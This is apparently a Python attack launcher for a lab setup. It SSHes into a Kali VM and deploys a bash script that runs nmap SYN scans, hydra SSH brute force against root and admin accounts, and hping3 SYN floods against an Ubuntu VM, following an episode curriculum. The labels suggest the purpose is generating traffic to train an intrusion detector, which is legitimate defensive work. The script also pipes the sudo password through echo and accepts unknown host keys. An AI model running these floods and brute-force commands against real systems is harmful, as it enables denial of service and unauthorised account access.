#import
import logging
import paramiko
logger = logging.getLogger(__name__)
KALI_SCRIPT_TEMPLATE = '#!/bin/bash\nTARGET="{ubuntu_ip}"\nmkdir -p /home/{kali_user}/attacks\n\ncase $1 in\n  scan)\n    # Full SYN scan — generates lots of connection attempts\n    echo {kali_pass} | sudo -S nmap -sS -p 1-1024 -T4 --max-retries 2 $TARGET 2>&1\n    ;;\n  brute)\n    # SSH brute force + HTTP brute\n    hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://$TARGET -t 4 -f 2>&1 | head -80 &\n    hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://$TARGET -t 4 -f 2>&1 | head -80 &\n    wait\n    ;;\n  exploit)\n    # SYN flood on port 22 — moderate rate, real source IP\n    echo {kali_pass} | sudo -S timeout 55 hping3 -S -p 22 -i u500 $TARGET 2>&1\n    ;;\n  ddos)\n    # SYN flood on port 80 — REAL source IP (not --rand-source, VMware drops random src)\n    echo {kali_pass} | sudo -S hping3 --flood -S -p 80 $TARGET 2>&1 &\n    HPID=$!\n    sleep 55\n    echo {kali_pass} | sudo -S kill $HPID 2>/dev/null\n    echo {kali_pass} | sudo -S killall hping3 2>/dev/null || true\n    ;;\n  web)\n    # Multi-port flood — simulates botnet behavior\n    echo {kali_pass} | sudo -S hping3 --flood -S -p 80 $TARGET 2>&1 &\n    echo {kali_pass} | sudo -S hping3 --flood -S -p 443 $TARGET 2>&1 &\n    sleep 55\n    echo {kali_pass} | sudo -S killall hping3 2>/dev/null || true\n    ;;\n  stop)\n    echo {kali_pass} | sudo -S pkill -9 -f hping3  2>/dev/null || true\n    pkill -f hydra   2>/dev/null || true\n    pkill -f nmap    2>/dev/null || true\n    echo "All attacks stopped."\n    ;;\nesac\n'
ATTACK_LABELS = {'scan': 'PortScan', 'brute': 'BruteForce', 'ddos': 'DDoS', 'exploit': 'DoS', 'web': 'Botnet'}

class AttackLauncher:

    def __init__(self, config: dict):
        net = config['network']
        kcfg = config['kali']
        vcfg = config.get('vmware', {})
        self.host = net['kali_ip']
        self.user = kcfg['user']
        self.pw = kcfg['password']
        self.ubuntu_ip = net['ubuntu_ip']
        self.script_remote = f'/home/{self.user}/attacks/run_episode.sh'
        base_port = int(vcfg.get('ssh_port', 22))
        self._ssh_port = int(kcfg['ssh_port']) if 'ssh_port' in kcfg else base_port
        self._ssh_timeout = int(vcfg.get('ssh_connect_timeout', 20))
        self._ssh_banner = int(vcfg.get('ssh_banner_timeout', 30))

    def _get_ssh(self) -> paramiko.SSHClient:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(self.host, port=self._ssh_port, username=self.user, password=self.pw, timeout=self._ssh_timeout, banner_timeout=self._ssh_banner, auth_timeout=self._ssh_timeout, allow_agent=False, look_for_keys=False)
        return c

    def deploy(self):
        script = KALI_SCRIPT_TEMPLATE.format(ubuntu_ip=self.ubuntu_ip, kali_user=self.user, kali_pass=self.pw)
        try:
            ssh = self._get_ssh()
            ssh.exec_command(f'mkdir -p /home/{self.user}/attacks')
            sftp = ssh.open_sftp()
            with sftp.open(self.script_remote, 'w') as f:
                f.write(script)
            ssh.exec_command(f'chmod +x {self.script_remote}')
            sftp.close()
            ssh.close()
            logger.info('Attack script deployed to Kali ✓')
        except Exception as e:
            logger.error(f'deploy failed: {e}')

    def launch(self, attack_type: str):
        try:
            ssh = self._get_ssh()
            ssh.exec_command(f'nohup bash {self.script_remote} {attack_type} > /tmp/attack_{attack_type}.log 2>&1 &')
            ssh.close()
            label = ATTACK_LABELS.get(attack_type, attack_type)
            logger.info(f'[KALI → UBUNTU] Launched attack: {label} ({attack_type})')
        except Exception as e:
            logger.error(f'launch failed: {e}')

    def stop(self):
        try:
            ssh = self._get_ssh()
            ssh.exec_command(f'bash {self.script_remote} stop')
            ssh.close()
            logger.info('[KALI] All attacks stopped.')
        except Exception as e:
            logger.warning(f'stop attacks failed: {e}')

    def curriculum(self, episode: int) -> str:
        if episode < 20:
            return 'scan'
        elif episode < 40:
            return 'brute'
        elif episode < 60:
            return 'ddos'
        elif episode < 80:
            return 'exploit'
        else:
            types = ['scan', 'brute', 'ddos', 'exploit', 'web']
            return types[episode % len(types)]
